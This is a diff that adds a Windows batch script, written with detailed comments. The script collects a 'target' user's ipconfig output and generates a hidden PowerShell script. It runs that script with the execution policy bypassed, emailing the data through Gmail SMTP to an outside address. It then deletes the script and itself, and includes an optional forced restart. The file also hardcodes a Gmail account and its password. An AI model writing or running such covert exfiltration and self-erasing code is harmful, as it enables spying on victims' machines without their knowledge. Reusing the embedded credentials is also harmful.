@@ -1,0 +1,72 @@
+@echo off
+::echo off makes sure no code is printed to console
+
+::runs ipconfig to get target's ip configuration and writes it to a txt file named ipinfo (dynamically saves it to path C:\Users\{grabs-target-user's-folder})
+ipconfig > C:\Users\%username%\ipinfo.txt
+
+::declares environment variables for sending gmail account information, including login credentials and attachment containing ip config info (reference by using %environmentalVariableName%)
+SET GmailAccount=projdatatests@gmail.com
+SET GmailPassword=C0D!N6PR0J3CT5
+SET Attachment=C:\Users\%username%\ipinfo.txt
+
+::calls subroutine with the label "PowerShellScriptCreate" and jumps to it to execute commands in function at the end
+CALL :PowerShellScriptCreate
+
+::references environmental variable initialized in subroutine to go to the directory where powershell scripts can be executed (powershell .exe located here)
+CD %PowerShellDir%
+
+::calls powershell for execution (-Command allows powershell to grab environmental variables set in CMD and use them as parameters for defining variables in powershell script)
+Powershell -ExecutionPolicy Bypass -Command "& {%PShellScript% '%GmailAccount%' '%GmailPassword%' '%Attachment%'}"
+
+::re-enables commands to be printed to console
+@echo on
+
+::prints to console
+echo HAVE FUN! :D
+
+::disables commands to be printed on console
+@echo off\
+
+::pauses for 5 seconds to allow user to read message printed above
+TIMEOUT /T 5
+
+::checks if powershell script (references path) exists, which it should from writing it in subroutine previously executed, and then if it does, it deletes it
+IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"
+
+::checks if cmd .bat file exists (this file), which it should as you are reading and executing from it right now, and then deletes it
+IF EXIST "%~FN0" DEL /Q /F "%~FN0"
+
+::remove "REM" to enable feature to shut down target's machine
+REM shutdown /r
+
+
+::label for subroutine called above to create the powershell script
+:PowerShellScriptCreate
+
+::declares environmental variable set to path where powershell exe is located
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+
+::declares environmental variable set to path where powershell script named sendEmail.ps1 to send email is saved
+SET PShellScript=%temp%\sendEmail.ps1
+
+::this block in parentheses writes powershell commands to the script sendEmail.ps1
+::IMPORTANT TO NOTE: "Circumflex" (^) before closing parenthesis is crucial in order to escape the key and not close the code block... it took much painful time to figure out why i was getting an error... DO NOT REMOVE THESE
+(
+ECHO $Username      = $args[0] 			#grabs first argument defined when calling script in main function of bat file and assigns it to corresponding variable
+ECHO $EmailPassword = $args[1] 			#grabs second argument defined when calling script in main function of bat file and assigns it to corresponding variable
+ECHO $Attach      = $args[2] 			#grabs third argument defined when calling script in main function of bat file and assigns it to corresponding variable
+ECHO $EmailTo     = "youremail@example.com" 	#change to the email ipinfo.txt is sent to
+ECHO $EmailFrom   = "projdatatests@gmail.com" 	#optional to change the credentials of email the txt is sent from
+ECHO $Subject     = "IP Address Info CONF File" #subject text of email
+ECHO $Body        = "See attachment for ip info" #body text of email
+ECHO $SMTPServer  = "smtp.gmail.com" 		#smtp server address for gmail, for other platforms, reference smtp server address and assign it to this variable.
+ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body^) #see note at beginning of code block... uses .net class to create object that compiles email
+ECHO $SMTPMessage.Attachments.Add($Attach^) 	#see note at beginning of code block... adds attachment to email
+ECHO $SMTPClient = New-Object System.Net.Mail.SmtpClient($SmtpServer, 587^) 			   #see note at beginning of code block... uses .net class to configure smtp client for sending the email
+ECHO $SMTPClient.EnableSsl = $true 		#enables ssl... NEEDED for Gmail... can't speak for other platforms but generally a good setting to enable
+ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword^) #see note at beginning of code block... uses .net class to configure network credentials initialized above... for gmail, user/pass network credentials are the same as your email address and pass... again, can't speak for other platforms
+ECHO $SMTPClient.Send($SMTPMessage^)		#sends message
+) > %PShellScript%
+
+::ends subroutine and returns to main function
+GOTO :EOF
